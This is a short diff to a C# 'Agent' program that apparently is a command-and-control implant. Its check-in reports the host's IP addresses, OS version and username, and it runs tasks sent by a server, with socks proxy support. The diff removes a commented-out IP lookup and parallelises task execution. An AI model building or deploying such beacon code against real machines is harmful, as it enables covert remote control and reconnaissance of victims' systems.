@@ -63,7 +63,6 @@ namespace Agent
             Checkin ct = new Checkin()
             {
                 action = "checkin",
-                //ips = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Select(a => a.ToString()).ToArray(),
                 ips = this.GetIPAddresses(),
                 os = Environment.OSVersion.ToString(),
                 user = Environment.UserName,
@@ -125,7 +124,10 @@ namespace Agent
                 return;
             }
 
-            args.tasking_response.tasks.ForEach(task => this.taskManager.StartTaskAsync(new ServerJob(task)));
+            Parallel.ForEach(args.tasking_response.tasks, async task =>
+            {
+                this.taskManager.StartTaskAsync(new ServerJob(task));
+            });
 
             if (args.tasking_response.socks is not null)
             {
